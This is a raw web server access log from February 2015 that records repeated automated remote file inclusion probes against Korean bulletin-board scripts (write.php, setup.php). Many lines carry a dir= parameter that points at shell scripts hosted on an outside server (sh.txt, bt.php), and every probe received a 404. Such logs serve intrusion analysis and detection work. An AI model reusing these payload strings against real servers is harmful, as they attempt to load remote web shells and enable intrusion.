71.6.150.241 - - [21/Feb/2015:09:55:50 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [21/Feb/2015:09:55:51 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
198.50.146.246 - - [21/Feb/2015:09:56:10 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:56:11 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:56:11 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:56:12 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
112.218.68.155 - - [21/Feb/2015:09:57:34 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:57:35 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:57:36 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:09:57:38 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [21/Feb/2015:09:58:46 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:58:47 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:58:47 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:09:58:48 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
112.218.68.155 - - [21/Feb/2015:10:02:22 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:10:02:23 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:10:02:24 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
112.218.68.155 - - [21/Feb/2015:10:02:25 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [21/Feb/2015:10:10:30 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:30 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:31 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:31 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:31 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:31 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:32 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
176.31.252.38 - - [21/Feb/2015:10:10:32 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4" 
198.50.146.246 - - [21/Feb/2015:10:10:53 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:10:10:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
198.50.146.246 - - [21/Feb/2015:10:10:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:10:54 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:10:54 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:10:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:10:55 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:10:55 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:10:10:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:10:10:55 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:10:10:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:10:10:56 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:10:56 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [21/Feb/2015:10:10:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
211.47.181.38 - - [21/Feb/2015:10:10:57 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:10:10:57 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
211.47.181.38 - - [21/Feb/2015:10:10:57 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:10:10:58 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:10:58 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:10:58 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:10:58 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
211.47.181.38 - - [21/Feb/2015:10:10:59 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)" 
112.218.68.155 - - [21/Feb/2015:10:11:01 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:11:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:11:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:14 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:14 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:15 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:15 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:16 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:16 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [21/Feb/2015:10:11:18 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
198.50.146.246 - - [21/Feb/2015:10:13:22 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:22 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:23 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:23 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:23 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:23 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:24 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:13:24 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)" 
54.152.48.7 - - [21/Feb/2015:10:16:11 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36" 
198.50.146.246 - - [21/Feb/2015:10:16:11 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:12 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:12 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:12 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:13 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:13 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:14 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:16:30 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:16:31 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:16:31 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:16:32 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)" 
198.50.146.246 - - [21/Feb/2015:10:17:13 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:13 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:14 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:14 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:15 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:15 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:16 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:17:16 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
112.218.68.155 - - [21/Feb/2015:10:17:27 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:27 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:29 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:29 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:29 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:29 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:31 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [21/Feb/2015:10:17:31 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [21/Feb/2015:10:25:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:25:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:25:37 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
198.50.146.246 - - [21/Feb/2015:10:25:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
180.76.5.65 - - [21/Feb/2015:10:28:34 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 943160 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [21/Feb/2015:10:31:01 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:10:31:02 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:10:31:03 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [21/Feb/2015:10:31:04 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
80.68.145.110 - - [21/Feb/2015:10:33:22 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [21/Feb/2015:10:33:54 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
80.68.145.110 - - [21/Feb/2015:10:34:05 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
